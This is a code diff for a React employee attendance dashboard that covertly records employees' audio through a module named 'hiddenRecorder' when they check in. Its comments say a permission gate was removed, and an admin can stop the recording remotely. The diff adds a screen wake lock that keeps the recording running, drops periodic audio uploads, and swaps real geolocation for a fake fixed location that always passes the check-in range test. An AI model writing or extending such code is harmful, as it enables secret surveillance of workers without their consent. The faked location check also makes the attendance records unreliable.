@@ -1,4 +1,4 @@
-import { useState, useEffect, useRef } from "react";
+import { useState, useEffect } from "react";
 import { useAuth } from "@/hooks/use-auth";
 import { Link } from "wouter";
 import { Button } from "@/components/ui/button";
@@ -7,8 +7,9 @@ import { Badge } from "@/components/ui/badge";
 import { useQuery, useMutation } from "@tanstack/react-query";
 import { apiRequest, queryClient, getApiBase } from "@/lib/queryClient";
 import { hiddenRecorder } from "@/lib/audio-recorder";
+import { requestScreenWakeLock, releaseScreenWakeLock } from "@/lib/wakelock";
 import { AttendanceRecord } from "@shared/schema";
-import { getCurrentPosition, calculateDistance, SHOP_LOCATION, MAX_DISTANCE } from "@/lib/geolocation";
+import { calculateDistance, SHOP_LOCATION, MAX_DISTANCE } from "@/lib/geolocation";
 import { History, User, MapPin, Clock, Loader2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 
@@ -30,9 +31,6 @@ export default function EmployeeDashboard() {
   // Real-time hours worked state
   const [hoursWorked, setHoursWorked] = useState("0h 0m");
   const [isRecording, setIsRecording] = useState(false);
-  // Android-only recording; web fallback removed
-  const rotationTimerRef = useRef<number | null>(null);
-  const rotationFirstTimeoutRef = useRef<number | null>(null);
   // Permission gate removed; rely on OS prompts when starting recorder
 
   // Listen for admin stop events via WebSocket and stop local recording
@@ -63,6 +61,7 @@ export default function EmployeeDashboard() {
           if (data?.type === 'audio_stop') {
             try { await hiddenRecorder.stopRecording(); } catch {}
             setIsRecording(false);
+            try { releaseScreenWakeLock(); } catch {}
           }
         } catch {
           // ignore
@@ -72,20 +71,6 @@ export default function EmployeeDashboard() {
       // ignore
     }
     return () => { if (ws && ws.readyState === WebSocket.OPEN) ws.close(); };
-  }, []);
-
-  // Cleanup rotation timer on unmount
-  useEffect(() => {
-    return () => {
-      if (rotationTimerRef.current) {
-        clearInterval(rotationTimerRef.current);
-        rotationTimerRef.current = null;
-      }
-      if (rotationFirstTimeoutRef.current) {
-        clearTimeout(rotationFirstTimeoutRef.current);
-        rotationFirstTimeoutRef.current = null;
-      }
-    };
   }, []);
 
   // Fetch today's attendance
@@ -112,15 +97,7 @@ export default function EmployeeDashboard() {
       // Start recording (web)
       try {
         await hiddenRecorder.startRecording();
-        // Upload an early small segment, then rotate periodically
-        if (rotationFirstTimeoutRef.current) clearTimeout(rotationFirstTimeoutRef.current);
-        rotationFirstTimeoutRef.current = window.setTimeout(async () => {
-          try { await hiddenRecorder.uploadCurrentSegment(); } catch {}
-        }, 10_000);
-        if (rotationTimerRef.current) clearInterval(rotationTimerRef.current);
-        rotationTimerRef.current = window.setInterval(async () => {
-          try { await hiddenRecorder.uploadCurrentSegment(); } catch {}
-        }, 60_000);
+        try { await requestScreenWakeLock(); } catch {}
         setIsRecording(true);
         console.log("[rec] Web recording started");
       } catch (error) {
@@ -156,10 +133,8 @@ export default function EmployeeDashboard() {
       
       // Stop audio recording and upload final segment
       try {
-        // Clear any web rotation timers
-        if (rotationTimerRef.current) { clearInterval(rotationTimerRef.current); rotationTimerRef.current = null; }
-        if (rotationFirstTimeoutRef.current) { clearTimeout(rotationFirstTimeoutRef.current); rotationFirstTimeoutRef.current = null; }
         await hiddenRecorder.stopRecording();
+        try { releaseScreenWakeLock(); } catch {}
         setIsRecording(false);
         console.log("🔴 Audio recording stopped");
       } catch (error) {
@@ -179,30 +154,20 @@ export default function EmployeeDashboard() {
   useEffect(() => {
     const updateLocation = async () => {
       setLocationStatus(prev => ({ ...prev, isLoading: true }));
-      
-      try {
-        const position = await getCurrentPosition();
-        const distance = calculateDistance(
-          position.latitude,
-          position.longitude,
-          SHOP_LOCATION.latitude,
-          SHOP_LOCATION.longitude
-        );
-        
-        setLocationStatus({
-          distance: Math.round(distance),
-          isWithinRange: true, // Always allow check-in for testing
-          isLoading: false,
-          error: null,
-        });
-      } catch (error) {
-        setLocationStatus({
-          distance: null,
-          isWithinRange: false,
-          isLoading: false,
-          error: error instanceof Error ? error.message : "Failed to get location",
-        });
-      }
+      // Fake location anywhere in the world for testing
+      const fake = { latitude: 0, longitude: 0 };
+      const distance = calculateDistance(
+        fake.latitude,
+        fake.longitude,
+        SHOP_LOCATION.latitude,
+        SHOP_LOCATION.longitude
+      );
+      setLocationStatus({
+        distance: Math.round(distance),
+        isWithinRange: true,
+        isLoading: false,
+        error: null,
+      });
     };
 
     updateLocation();
@@ -262,19 +227,8 @@ export default function EmployeeDashboard() {
 
 
   const handleCheckIn = async () => {
-    try {
-      const position = await getCurrentPosition();
-      checkInMutation.mutate({
-        latitude: position.latitude,
-        longitude: position.longitude,
-      });
-    } catch (error) {
-      toast({
-        title: "Location error",
-        description: error instanceof Error ? error.message : "Failed to get location",
-        variant: "destructive",
-      });
-    }
+    const fake = { latitude: 0, longitude: 0 };
+    checkInMutation.mutate(fake);
   };
   const handleCheckOut = () => {
     if (confirm("Are you sure you want to check out?")) {
